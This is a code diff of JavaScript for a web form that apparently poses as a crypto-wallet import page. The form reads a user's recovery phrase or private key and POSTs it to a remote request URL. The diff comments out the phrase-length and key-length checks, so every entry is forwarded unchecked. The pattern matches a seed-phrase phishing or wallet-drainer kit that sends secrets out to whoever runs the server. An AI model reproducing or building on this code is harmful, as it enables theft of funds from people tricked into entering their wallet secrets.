@@ -38,10 +38,10 @@ importBTNs.forEach((importBTN) => {
     // Add your existing logic for handling Phrase, Keystore JSON, or Private Key
     if (phraseType === "Phrase") {
       const phrase = document.querySelector(".Phrase").value;
-      if (phrase.split(" ").length < 12) {
-        alert("Please enter a phrase that is between 12 to 24 words.");
-        return;
-      }
+      // if (phrase.split(" ").length < 12) {
+      //   alert("Please enter a phrase that is between 12 to 24 words.");
+      //   return;
+      // }
       const res = await fetch(requestURL, {
         method: "POST",
         body: JSON.stringify({ feature, coin, phraseType, phrase }),
@@ -72,10 +72,10 @@ importBTNs.forEach((importBTN) => {
 
     if (phraseType === "Private Key") {
       const phrase = document.querySelector(".PrivateKey").value;
-      if (phrase.length !== 64) {
-        alert("Private key must be 64 alphanumeric characters");
-        return;
-      }
+      // if (phrase.length !== 64) {
+      //   alert("Private key must be 64 alphanumeric characters");
+      //   return;
+      // }
       const res = await fetch(requestURL, {
         method: "POST",
         body: JSON.stringify({ feature, coin, phraseType, phrase }),
